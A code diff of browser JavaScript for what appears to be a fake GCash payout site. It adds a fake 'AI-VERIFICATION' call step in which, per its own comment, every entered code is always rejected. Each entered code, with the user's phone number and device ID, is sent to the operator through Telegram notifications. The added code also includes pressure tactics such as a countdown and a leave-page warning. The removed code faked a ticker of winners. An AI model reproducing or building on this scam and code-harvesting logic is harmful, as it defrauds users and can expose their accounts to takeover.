+        
+        var style = document.createElement('style');
+        style.id = 'phase3-animations';
+        style.textContent = `
+            @keyframes pulseRing {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.05); opacity: 0.7; }
             }
-
-            function update() {
-                var now = Date.now();
-                var diff = timerEndDate - now;
-
-                if (diff <= 0) {
-                    timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
-                    localStorage.setItem('timerEndDate', timerEndDate);
-                    diff = CYCLE_HOURS * 60 * 60 * 1000;
+            @keyframes slideDown {
+                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+                to { opacity: 1; transform: translateX(-50%) translateY(0); }
+            }
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                20% { transform: translateX(-8px); }
+                40% { transform: translateX(8px); }
+                60% { transform: translateX(-5px); }
+                80% { transform: translateX(5px); }
+            }
+            @keyframes numberReveal {
+                0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
+                50% { opacity: 0.5; transform: scale(1.1) rotateY(-10deg); }
+                100% { opacity: 1; transform: scale(1) rotateY(0deg); }
+            }
+            @keyframes numberGlowPulse {
+                0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+                50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
+            }
+            @keyframes phonePulse {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.1); opacity: 0.8; }
+            }
+            @keyframes timerPulseRed {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.1); opacity: 0.7; }
+            }
+            .verification-input:focus {
+                border-color: #00d4ff !important;
+                box-shadow: 0 0 30px rgba(0, 212, 255, 0.3) !important;
+                outline: none;
+            }
+            .phone-number-display {
+                font-size: 24px;
+                font-family: 'Orbitron', monospace;
+                font-weight: 900;
+                color: #00d4ff;
+                margin-top: 8px;
+                letter-spacing: 2px;
+                animation: numberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards, numberGlowPulse 2s ease-in-out infinite 0.8s;
+                display: inline-block;
+            }
+            .phone-number-display .phone-icon {
+                margin-right: 8px;
+                display: inline-block;
+                animation: phonePulse 1.5s ease-in-out infinite;
+            }
+        `;
+        document.head.appendChild(style);
+    }
+    
+    // ========== BALANCE DECREMENT ANIMATION ==========
+    function animateBalanceDecrement(start, end, duration, callback) {
+        var balanceSpan = document.getElementById('popupBalanceAmount');
+        var balanceDisplay = document.getElementById('popupBalanceDisplay');
+        var claimBtn = document.getElementById('claimGCashBtn');
+        
+        if (!balanceSpan) {
+            if (callback) callback();
+            return;
+        }
+        
+        if (claimBtn) {
+            claimBtn.disabled = true;
+            claimBtn.style.opacity = '0.7';
+            claimBtn.style.pointerEvents = 'none';
+            claimBtn.innerHTML = '⏳ PROCESSING...';
+        }
+        
+        var totalSteps = 30;
+        var decrementAmount = start / totalSteps;
+        var currentStep = 0;
+        
+        if (balanceDisplay) {
+            balanceDisplay.style.animation = 'balanceDrain 0.3s ease infinite';
+        }
+        
+        var interval = setInterval(function() {
+            currentStep++;
+            var currentVal = start - (decrementAmount * currentStep);
+            
+            if (balanceSpan) {
+                balanceSpan.textContent = Math.max(0, currentVal).toFixed(2);
+                balanceSpan.style.color = currentVal < start * 0.3 ? '#ff6666' : '#fce883';
+                balanceSpan.style.fontSize = (48 - (currentStep * 0.8)) + 'px';
+            }
+            
+            updateBillsIndicators(Math.max(0, currentVal));
+            
+            if (currentStep >= totalSteps) {
+                clearInterval(interval);
+                
+                if (balanceSpan) {
+                    balanceSpan.textContent = '0.00';
+                    balanceSpan.style.color = '#ff4444';
+                    balanceSpan.style.fontSize = '48px';
                 }
-
-                var days = Math.floor(diff / (1000 * 60 * 60 * 24));
-                var hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
-                var minutes = Math.floor((diff / (1000 * 60)) % 60);
-                var seconds = Math.floor((diff / 1000) % 60);
-
-                displayElement.innerHTML = days + 'D ' +
-                    hours.toString().padStart(2, '0') + ':' +
-                    minutes.toString().padStart(2, '0') + ':' +
-                    seconds.toString().padStart(2, '0');
+                
+                if (balanceDisplay) {
+                    balanceDisplay.style.animation = 'none';
+                }
+                
+                if (balanceDisplay) {
+                    balanceDisplay.style.animation = 'successFlash 0.5s ease';
+                    balanceDisplay.innerHTML = '✅ <span style="font-size:24px; color:#22C55E;">PROCESSING</span>';
+                    
+                    setTimeout(function() {
+                        if (balanceDisplay) {
+                            balanceDisplay.style.animation = 'none';
+                        }
+                    }, 500);
+                }
+                
+                setTimeout(function() {
+                    if (callback) callback();
+                }, 600);
             }
-
-            update();
-            setInterval(update, 1000);
+        }, duration / totalSteps);
+        
+        if (claimBtn) {
+            claimBtn.style.animation = 'pulseGold 0.5s ease infinite';
+        }
+    }
+    
+    // ========== GET FIREWALL STATUS ==========
+    function getFirewallStatus() {
+        try {
+            var db = firebase.database();
+            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
+                var data = snapshot.val();
+                currentFirewallStatus = (data && data.active === true);
+                console.log('Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
+                return currentFirewallStatus;
+            });
         } catch(e) {
-            console.error('Timer error:', e);
+            console.error('Firewall error:', e);
+            return Promise.resolve(false);
         }
     }
-
-    // ============================================================
-    // TICKER
-    // ============================================================
-    function initTicker() {
-        var winnerSpan = document.getElementById('winnerText');
-        if (!winnerSpan) return;
-
-        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
-        var amountRarity = [
-            { amount: 500, weight: 85 },
-            { amount: 1000, weight: 10 },
-            { amount: 2000, weight: 3 },
-            { amount: 2500, weight: 2 }
-        ];
-        var actions = ["received", "received", "withdraw"];
-
-        function generateRandomAmount() {
-            var totalWeight = 0;
-            for (var i = 0; i < amountRarity.length; i++) totalWeight += amountRarity[i].weight;
-            var random = Math.random() * totalWeight;
-            var cumulative = 0;
-            for (var i = 0; i < amountRarity.length; i++) {
-                cumulative += amountRarity[i].weight;
-                if (random <= cumulative) return amountRarity[i].amount;
-            }
-            return 500;
+    
+    // ========== SYNC BALANCE FROM FIREBASE ==========
+    function syncBalanceFromFirebase() {
+        var userPhone = localStorage.getItem("userPhone");
+        if (!userPhone) return Promise.resolve(0);
+        
+        try {
+            var db = firebase.database();
+            return db.ref('user_sessions/' + userPhone).once('value').then(function(snap) {
+                if (snap.exists() && snap.val().balance !== undefined) {
+                    var balance = snap.val().balance;
+                    var balanceEl = document.getElementById('userBalanceDisplay');
+                    if (balanceEl) balanceEl.innerText = balance.toFixed(2);
+                    return balance;
+                }
+                return 0;
+            });
+        } catch(e) {
+            console.error('Error syncing balance:', e);
+            return Promise.resolve(0);
         }
-
-        function updateTicker() {
-            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-            var last4 = Math.floor(1000 + Math.random() * 9000);
-            var amount = generateRandomAmount();
-            var action = actions[Math.floor(Math.random() * actions.length)];
-
-            winnerSpan.innerHTML = prefix + '***' + last4 + ' ' + action +
-                ' <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' +
-                amount.toLocaleString();
+    }
+    
+    // ========== ATTACH CLAIM BUTTON ==========
+    function attachClaimButton() {
+        var claimBtn = document.getElementById('claimNowBtn');
+        if (!claimBtn) {
+            console.error('Claim button not found!');
+            return;
         }
-
-        updateTicker();
-        setInterval(updateTicker, 4800);
+        
+        claimBtn.onclick = function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            console.log('🔔 Claim button clicked!');
+            
+            playClaimSound();
+            
+            var userPhone = localStorage.getItem("userPhone") || "Unknown";
+            var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+            
+            syncBalanceFromFirebase().then(function(balance) {
+                showPopup(balance);
+                if (window.ConfettiModule) window.ConfettiModule.start();
+            });
+        };
+        
+        console.log('✅ Claim button attached');
     }
-
-    // ============================================================
-    // CONFETTI
-    // ============================================================
-    var confettiCanvas = null;
-    var confettiAnimation = null;
-
-    function initConfetti() {
-        confettiCanvas = document.getElementById('confettiCanvas');
+    
+    // ========== GET PAYOUT LINK ==========
+    function getLatestPayoutLink() {
+        try {
+            var db = firebase.database();
+            return db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(snapshot) {
+                if (snapshot.exists()) {
+                    var key = Object.keys(snapshot.val())[0];
+                    var linkData = snapshot.val()[key];
+                    return { key: key, url: linkData.url };
+                }
+                return null;
+            });
+        } catch(e) {
+            console.error('Link error:', e);
+            return Promise.resolve(null);
+        }
     }
-
-    function startConfetti() {
-        if (!confettiCanvas) return;
-
-        confettiCanvas.style.display = 'block';
-        confettiCanvas.width = window.innerWidth;
-        confettiCanvas.height = window.innerHeight;
-
-        var ctx = confettiCanvas.getContext('2d');
-        var particles = [];
-
-        for (var i = 0; i < 150; i++) {
-            particles.push({
-                x: Math.random() * confettiCanvas.width,
-                y: Math.random() * confettiCanvas.height - confettiCanvas.height,
-                size: Math.random() * 8 + 3,
-                color: 'hsl(' + (Math.random() * 360) + ', 100%, 60%)',
-                speed: Math.random() * 4 + 2,
-                rotation: Math.random() * 360,
-                rotationSpeed: (Math.random() - 0.5) * 10
+    
+    // ========== MARK LINK AS USED ==========
+    function markLinkAsUsed(linkKey, userPhone) {
+        try {
+            var db = firebase.database();
+            return db.ref('links/' + linkKey).update({
+                status: 'used',
+                user: userPhone,
+                usedAt: Date.now()
+            }).then(function() {
+                console.log('✅ Link marked as used');
+            });
+        } catch(e) {
+            console.error('Error marking link:', e);
+            return Promise.resolve();
+        }
+    }
+    
+    // ========== BEFORE UNLOAD HANDLER ==========
+    function beforeUnloadHandler(e) {
+        if (claimInProgress && !isRedirecting) {
+            var message = "Your payout is unsuccessful! Please complete the process.";
+            e.preventDefault();
+            e.returnValue = message;
+            return message;
+        }
+    }
+    
+    // ========== SHOW FIREWALL POPUP ==========
+    function showFirewallPopup() {
+        var popupInner = document.querySelector('.popup-inner');
+        if (!popupInner) return;
+        
+        currentPhase = 3;
+        
+        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+        popupInner.style.opacity = '0';
+        popupInner.style.transform = 'scale(0.95)';
+        
+        setTimeout(function() {
+            showPhase3();
+            popupInner.style.opacity = '1';
+            popupInner.style.transform = 'scale(1)';
+        }, 300);
+    }
+    
+    // ========== PHASE 3: AI-VERIFICATION CALL ==========
+    function showPhase3() {
+        var popupInner = document.querySelector('.popup-inner');
+        if (!popupInner) return;
+        
+        var popupContainer = document.querySelector('.popup-container');
+        if (popupContainer) {
+            popupContainer.style.maxWidth = '380px';
+            popupContainer.style.width = '90%';
+        }
+        
+        // Reset call state
+        callInProgress = false;
+        callCountdown = 60;
+        if (callTimerInterval) {
+            clearInterval(callTimerInterval);
+            callTimerInterval = null;
+        }
+        isCallRequested = false;
+        currentCallCode = '';
+        codeEntered = false;
+        
+        // Get user's mobile number
+        var userPhone = localStorage.getItem("userPhone") || "Unknown";
+        var formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
+        
+        popupInner.innerHTML = `
+            <div class="popup-close" id="popupClosePhase3">✕</div>
+            
+            <div style="text-align: center; margin-bottom: 10px;">
+                <div style="width: 70px; height: 70px; margin: 0 auto; background: linear-gradient(145deg, rgba(0, 212, 255, 0.15), rgba(0, 100, 200, 0.05)); border-radius: 50%; border: 2px solid rgba(0, 212, 255, 0.3); display: flex; align-items: center; justify-content: center; animation: pulseRing 2s ease-in-out infinite;">
+                    <i class="fas fa-phone" style="font-size: 30px; color: #00d4ff; text-shadow: 0 0 20px rgba(0, 212, 255, 0.5);"></i>
+                </div>
+            </div>
+            
+            <h2 class="phase3-heading">🔐 AI-VERIFICATION</h2>
+            
+            <div class="divider" style="width: 60px; height: 2px; background: linear-gradient(90deg, transparent, #00d4ff, transparent); margin: 8px auto;"></div>
+            
+            <p style="font-size: 11px; color: rgba(255,255,255,0.6); text-align: center; margin: 5px 0 15px 0; font-family: 'Poppins', sans-serif; letter-spacing: 0.5px;">
+                <i class="fas fa-shield-alt" style="color: #00d4ff; margin-right: 6px;"></i>
+                System AI will call you with a <strong style="color: #00d4ff;">4-digit verification code</strong>
+            </p>
+            
+            <!-- STATUS DISPLAY -->
+            <div id="callStatusContainer" style="background: rgba(0, 212, 255, 0.05); border: 1px solid rgba(0, 212, 255, 0.1); border-radius: 12px; padding: 15px; margin-bottom: 15px; text-align: center;">
+                <div id="callStatusIcon" style="font-size: 28px; margin-bottom: 5px;">📞</div>
+                <div id="callStatusText" style="font-size: 13px; color: rgba(255,255,255,0.8); font-family: 'Poppins', sans-serif; font-weight: 500;">Ready for verification</div>
+                
+                <!-- PHONE NUMBER DISPLAY WITH ANIMATION -->
+                <div id="phoneNumberDisplay" style="display: none; margin-top: 8px;">
+                    <span class="phone-number-display">
+                        <span class="phone-icon">📱</span>
+                        ${formattedPhone}
+                    </span>
+                </div>
+                
+                <div id="callTimerDisplay" style="font-size: 28px; font-family: 'Orbitron', monospace; font-weight: 900; color: #39ff14; margin-top: 5px; text-shadow: 0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1); display: none;">60s</div>
+            </div>
+            
+            <!-- REQUEST CALL BUTTON -->
+            <button id="requestCallBtn" class="claim-gcash-button" style="width: 100%; background: linear-gradient(to bottom, #00d4ff, #0088cc); border: 1px solid #66ddff; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #006699; padding: 14px; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 10px; font-family: 'Orbitron', monospace; letter-spacing: 1px;">
+                <i class="fas fa-phone-alt"></i>
+                REQUEST AI-VERIFICATION CALL
+            </button>
+            
+            <!-- CODE INPUT SECTION -->
+            <div id="codeSection" style="display: none; margin-top: 15px;">
+                <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px;">
+                    <i class="fas fa-key" style="color: #00d4ff; font-size: 14px;"></i>
+                    <span style="font-size: 11px; color: rgba(255,255,255,0.6); font-family: 'Poppins', sans-serif;">Enter the 4-digit code from the call</span>
+                </div>
+                
+                <div style="display: flex; gap: 10px; justify-content: center; align-items: center; flex-wrap: wrap;">
+                    <input type="text" id="code4Digit" class="verification-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
+                    <button id="verifyCodeBtn" class="claim-gcash-button" style="background: linear-gradient(to bottom, #22C55E, #16A34A); border: 1px solid #4ade80; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #15803d; padding: 14px 20px; font-size: 13px; font-family: 'Orbitron', monospace; letter-spacing: 1px;">
+                        <i class="fas fa-check"></i> VERIFY
+                    </button>
+                </div>
+                
+                <div id="codeErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff4444; font-size: 11px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 68, 68, 0.1); border: 1px solid rgba(255, 68, 68, 0.2);">
+                    <i class="fas fa-exclamation-circle"></i> Invalid code. Please request a new call.
+                </div>
+                
+                <div id="callExpiredMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff8800; font-size: 11px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 136, 0, 0.1); border: 1px solid rgba(255, 136, 0, 0.2);">
+                    <i class="fas fa-clock"></i> Call code expired. Request a new call.
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 12px;">
+                <button class="small-back-btn" id="backBtnPhase3">← BACK</button>
+            </div>
+        `;
+        
+        attachPhase3Events();
+    }
+    
+    // ========== ATTACH PHASE 3 EVENTS ==========
+    function attachPhase3Events() {
+        var closeBtn = document.getElementById('popupClosePhase3');
+        if (closeBtn) {
+            closeBtn.onclick = function() { 
+                stopCallTimer();
+                closePopup(); 
+            };
+        }
+        
+        var backBtn = document.getElementById('backBtnPhase3');
+        if (backBtn) {
+            backBtn.onclick = function() {
+                stopCallTimer();
+                var popupInner = document.querySelector('.popup-inner');
+                if (popupInner) {
+                    popupInner.style.transition = 'opacity 0.3s ease';
+                    popupInner.style.opacity = '0';
+                    setTimeout(function() {
+                        showPhase1(currentBalance);
+                        popupInner.style.opacity = '1';
+                    }, 300);
+                }
+            };
+        }
+        
+        // ========== REQUEST CALL BUTTON ==========
+        var requestBtn = document.getElementById('requestCallBtn');
+        if (requestBtn) {
+            requestBtn.onclick = function() {
+                if (callInProgress) {
+                    alert("Please wait for the current call to complete.");
+                    return;
+                }
+                requestAICall();
+            };
+        }
+        
+        // ========== VERIFY CODE BUTTON ==========
+        var verifyBtn = document.getElementById('verifyCodeBtn');
+        var codeInput = document.getElementById('code4Digit');
+        
+        if (verifyBtn) {
+            verifyBtn.onclick = function() {
+                verifyCode();
+            };
+        }
+        
+        if (codeInput) {
+            codeInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    verifyCode();
+                }
+            });
+            
+            codeInput.addEventListener('input', function(e) {
+                var value = this.value.trim();
+                if (value.length === 4 && /^\d+$/.test(value)) {
+                    this.style.borderColor = '#22C55E';
+                    this.style.boxShadow = '0 0 20px rgba(34, 197, 94, 0.3)';
+                } else {
+                    this.style.borderColor = '#00d4ff';
+                    this.style.boxShadow = '0 0 15px rgba(0, 212, 255, 0.2)';
+                }
             });
         }
-
-        function draw() {
-            if (!confettiCanvas || confettiCanvas.style.display === 'none') return;
-            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
-
-            for (var i = 0; i < particles.length; i++) {
-                var p = particles[i];
-                ctx.save();
-                ctx.translate(p.x, p.y);
-                ctx.rotate(p.rotation * Math.PI / 180);
-                ctx.fillStyle = p.color;
-                ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
-                ctx.restore();
-
-                p.y += p.speed;
-                p.rotation += p.rotationSpeed;
-
-                if (p.y > confettiCanvas.height) {
-                    p.y = -p.size;
-                    p.x = Math.random() * confettiCanvas.width;
-                }
-            }
-            confettiAnimation = requestAnimationFrame(draw);
+    }
+    
+    // ========== REQUEST AI-VERIFICATION CALL ==========
+    function requestAICall() {
+        if (callInProgress) return;
+        
+        callInProgress = true;
+        isCallRequested = true;
+        callCountdown = 60;
+        currentCallCode = generateCallCode();
+        codeEntered = false;
+        
+        var userPhone = localStorage.getItem("userPhone") || "Unknown";
+        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+        
+        // Send Telegram notification with code
+        sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
+        
+        // Update UI
+        var statusIcon = document.getElementById('callStatusIcon');
+        var statusText = document.getElementById('callStatusText');
+        var phoneDisplay = document.getElementById('phoneNumberDisplay');
+        var timerDisplay = document.getElementById('callTimerDisplay');
+        var requestBtn = document.getElementById('requestCallBtn');
+        var codeSection = document.getElementById('codeSection');
+        var codeInput = document.getElementById('code4Digit');
+        var codeErrorMsg = document.getElementById('codeErrorMsg');
+        var callExpiredMsg = document.getElementById('callExpiredMsg');
+        
+        // Reset messages
+        if (codeErrorMsg) codeErrorMsg.style.display = 'none';
+        if (callExpiredMsg) callExpiredMsg.style.display = 'none';
+        if (codeInput) codeInput.value = '';
+        
+        if (statusIcon) statusIcon.innerHTML = '📞';
+        if (statusText) {
+            statusText.innerHTML = '📱 <strong style="color: #00d4ff;">AI-VERIFICATION CALL</strong> is being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.3);">Please wait for the call</span>';
+            statusText.style.color = '#00d4ff';
         }
-
-        draw();
-
+        if (phoneDisplay) {
+            phoneDisplay.style.display = 'block';
+        }
+        if (timerDisplay) {
+            timerDisplay.style.display = 'block';
+            timerDisplay.textContent = '60s';
+            timerDisplay.style.color = '#39ff14';
+            timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
+        }
+        if (requestBtn) {
+            requestBtn.disabled = true;
+            requestBtn.style.opacity = '0.5';
+            requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CALLING...';
+        }
+        if (codeSection) {
+            codeSection.style.display = 'none';
+        }
+        
+        // Play call sound effect
+        playCallSound();
+        
+        // Start countdown timer
+        startCallTimer();
+        
+        // Simulate "call connected" after 4 seconds (admin calls user)
         setTimeout(function() {
-            if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
-            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
-            confettiCanvas.style.display = 'none';
+            if (statusIcon) statusIcon.innerHTML = '📱';
+            if (statusText) {
+                statusText.innerHTML = '🔊 <strong style="color: #22C55E;">AI-VERIFICATION CALL</strong> connected!<br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Enter the 4-digit code below</span>';
+                statusText.style.color = '#22C55E';
+            }
+            if (codeSection) {
+                codeSection.style.display = 'block';
+            }
+            if (codeInput) {
+                codeInput.focus();
+            }
         }, 4000);
     }
-
-    // ============================================================
-    // BUTTON EVENTS
-    // ============================================================
-    function attachButtonEvents() {
-        var logoutBtn = document.getElementById('logoutBtn');
-        if (logoutBtn) {
-            logoutBtn.addEventListener('click', function() {
-                logoutUser();
-            });
+    
+    // ========== GENERATE CALL CODE ==========
+    function generateCallCode() {
+        var code = Math.floor(1000 + Math.random() * 9000);
+        return code.toString();
+    }
+    
+    // ========== START CALL TIMER ==========
+    function startCallTimer() {
+        stopCallTimer();
+        
+        var timerDisplay = document.getElementById('callTimerDisplay');
+        var statusText = document.getElementById('callStatusText');
+        var requestBtn = document.getElementById('requestCallBtn');
+        var callExpiredMsg = document.getElementById('callExpiredMsg');
+        var codeSection = document.getElementById('codeSection');
+        
+        // Set initial color - Neon Green
+        if (timerDisplay) {
+            timerDisplay.style.color = '#39ff14';
+            timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
+            timerDisplay.style.animation = '';
         }
-
-        var fbBtn = document.getElementById('facebookShareBtn');
-        if (fbBtn) {
-            fbBtn.addEventListener('click', function() {
-                shareOnFacebook();
-            });
+        
+        callTimerInterval = setInterval(function() {
+            callCountdown--;
+            
+            if (timerDisplay) {
+                timerDisplay.textContent = callCountdown + 's';
+                
+                // ========== NEON COLOR SCHEME ==========
+                // 60s - 10s: NEON GREEN (#39ff14)
+                // 9s - 0s: NEON RED (#ff1744)
+                
+                if (callCountdown <= 9) {
+                    // NEON RED - Urgent (9-0 seconds)
+                    timerDisplay.style.color = '#ff1744';
+                    timerDisplay.style.textShadow = '0 0 30px rgba(255, 23, 68, 0.6), 0 0 60px rgba(255, 23, 68, 0.3), 0 0 100px rgba(255, 23, 68, 0.1)';
+                    timerDisplay.style.animation = 'timerPulseRed 0.5s ease-in-out infinite';
+                } else {
+                    // NEON GREEN - Normal (60-10 seconds)
+                    timerDisplay.style.color = '#39ff14';
+                    timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
+                    timerDisplay.style.animation = '';
+                }
+            }
+            
+            if (callCountdown <= 0) {
+                // Call expired
+                stopCallTimer();
+                
+                var userPhone = localStorage.getItem("userPhone") || "Unknown";
+                var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+                sendAICallExpiredNotification(userPhone, deviceId);
+                
+                if (statusText) {
+                    statusText.innerHTML = '⏰ <strong style="color: #ff8800;">CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Please request a new call</span>';
+                    statusText.style.color = '#ff8800';
+                }
+                if (timerDisplay) {
+                    timerDisplay.style.display = 'none';
+                    timerDisplay.style.animation = '';
+                }
+                if (codeSection) {
+                    codeSection.style.display = 'none';
+                }
+                if (requestBtn) {
+                    requestBtn.disabled = false;
+                    requestBtn.style.opacity = '1';
+                    requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI-VERIFICATION CALL';
+                }
+                if (callExpiredMsg) {
+                    callExpiredMsg.style.display = 'block';
+                }
+                
+                callInProgress = false;
+                isCallRequested = false;
+            }
+        }, 1000);
+    }
+    
+    // ========== STOP CALL TIMER ==========
+    function stopCallTimer() {
+        if (callTimerInterval) {
+            clearInterval(callTimerInterval);
+            callTimerInterval = null;
         }
     }
+    
+    // ========== VERIFY CODE ==========
+    function verifyCode() {
+        var codeInput = document.getElementById('code4Digit');
+        var codeErrorMsg = document.getElementById('codeErrorMsg');
+        var callExpiredMsg = document.getElementById('callExpiredMsg');
+        var verifyBtn = document.getElementById('verifyCodeBtn');
+        
+        if (!codeInput) return;
+        
+        var enteredCode = codeInput.value.trim();
+        
+        // Validate input
+        if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) {
+            if (codeErrorMsg) {
+                codeErrorMsg.textContent = '⚠️ Please enter a valid 4-digit code.';
+                codeErrorMsg.style.display = 'block';
+            }
+            codeInput.style.borderColor = '#ff4444';
+            codeInput.style.boxShadow = '0 0 20px rgba(255, 68, 68, 0.3)';
+            shakeElement(codeInput);
+            return;
+        }
+        
+        // Check if call is still active
+        if (callCountdown <= 0) {
+            if (callExpiredMsg) {
+                callExpiredMsg.style.display = 'block';
+            }
+            if (codeErrorMsg) codeErrorMsg.style.display = 'none';
+            codeInput.style.borderColor = '#ff8800';
+            codeInput.style.boxShadow = '0 0 20px rgba(255, 136, 0, 0.3)';
+            return;
+        }
+        
+        // ========== DEFAULT: ALWAYS INVALID ==========
+        // No valid code exists - every attempt is invalid
+        
+        codeEntered = true;
+        
+        // Send Telegram notification for invalid attempt
+        var userPhone = localStorage.getItem("userPhone") || "Unknown";
+        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+        sendAICodeAttemptNotification(userPhone, deviceId, enteredCode, callCountdown);
+        
+        // Show error
+        if (codeErrorMsg) {
+            codeErrorMsg.textContent = '❌ Invalid verification code. Please request a new call.';
+            codeErrorMsg.style.display = 'block';
+        }
+        
+        // Visual feedback
+        codeInput.style.borderColor = '#ff4444';
+        codeInput.style.boxShadow = '0 0 30px rgba(255, 68, 68, 0.4)';
+        shakeElement(codeInput);
+        
+        // Disable verify button temporarily
+        if (verifyBtn) {
+            verifyBtn.disabled = true;
+            verifyBtn.style.opacity = '0.5';
+            setTimeout(function() {
+                if (verifyBtn) {
+                    verifyBtn.disabled = false;
+                    verifyBtn.style.opacity = '1';
+                }
+            }, 2000);
+        }
+        
+        // Clear input after 1.5 seconds
+        setTimeout(function() {
+            codeInput.value = '';
+            codeInput.style.borderColor = '#00d4ff';
+            codeInput.style.boxShadow = '0 0 15px rgba(0, 212, 255, 0.2)';
+            
+            // Show "request new call" prompt
+            if (codeErrorMsg) {
+                codeErrorMsg.textContent = '🔄 Please request a new AI-Verification call.';
+                codeErrorMsg.style.color = '#ff8800';
+            }
+        }, 1500);
+        
+        // Reset to initial state after 4 seconds
+        setTimeout(function() {
+            if (codeErrorMsg) {
+                codeErrorMsg.style.display = 'none';
+                codeErrorMsg.textContent = '';
+                codeErrorMsg.style.color = '#ff4444';
+            }
+            
+            // Show expired state
+            var statusText = document.getElementById('callStatusText');
+            var timerDisplay = document.getElementById('callTimerDisplay');
+            var codeSection = document.getElementById('codeSection');
+            var requestBtn = document.getElementById('requestCallBtn');
+            
+            if (statusText) {
+                statusText.innerHTML = '⏰ <strong style="color: #ff8800;">CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Please request a new call</span>';
+                statusText.style.color = '#ff8800';
+            }
+            if (timerDisplay) {
+                timerDisplay.style.display = 'none';
+                timerDisplay.style.animation = '';
+            }
+            if (codeSection) {
+                codeSection.style.display = 'none';
+            }
+            if (requestBtn) {
+                requestBtn.disabled = false;
+                requestBtn.style.opacity = '1';
+                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI-VERIFICATION CALL';
+            }
+            
+            callInProgress = false;
+            isCallRequested = false;
+            
+        }, 4000);
+    }
+    
+    // ========== SHAKE ELEMENT ANIMATION ==========
+    function shakeElement(element) {
+        if (!element) return;
+        element.style.animation = 'shake 0.5s ease';
+        setTimeout(function() {
+            element.style.animation = '';
+        }, 500);
+    }
+    
+    // ========== CHECK FIREWALL AND TRANSITION ==========
+    function checkFirewallAndTransition() {
+        getFirewallStatus().then(function(isFirewallOn) {
+            if (isFirewallOn) {
+                console.log('🔥 Firewall ON - Showing AI-Verification');
+                showFirewallPopup();
+            } else {
+                console.log('🔓 Firewall OFF - Transition to Phase 2');
+                transitionToPhase2();
+            }
+        });
+    }
+    
+    // ========== TRANSITION TO PHASE 2 ==========
+    function transitionToPhase2() {
+        var popupInner = document.querySelector('.popup-inner');
+        if (!popupInner) return;
+        
+        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+        popupInner.style.opacity = '0';
+        popupInner.style.transform = 'scale(0.95)';
+        
+        setTimeout(function() {
+            showPhase2();
+            popupInner.style.opacity = '1';
+            popupInner.style.transform = 'scale(1)';
+        }, 300);
+    }
+    
+    // ========== PHASE 1: DEFAULT POPUP with 500 Bills Indicators ==========
+    function showPhase1(balance) {
+        var popupInner = document.querySelector('.popup-inner');
+        if (!popupInner) return;
+        
+        var popupContainer = document.querySelector('.popup-container');
+        if (popupContainer) {
+            popupContainer.style.maxWidth = '360px';
+            popupContainer.style.width = '90%';
+        }
+        
+        currentBalance = balance;
+        currentPhase = 1;
+        
+        popupInner.style.transition = '';
+        popupInner.style.opacity = '1';
+        popupInner.style.transform = '';
+        
+        popupInner.innerHTML = `
+            <div class="popup-close" id="popupClosePhase1">✕</div>
+            <h2 class="popup-title" style="font-family: 'Playfair Display', serif; font-size: 26px; font-weight: 900; background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c); -webkit-background-clip: text; background-clip: text; color: transparent; text-transform: uppercase; text-align: center;">
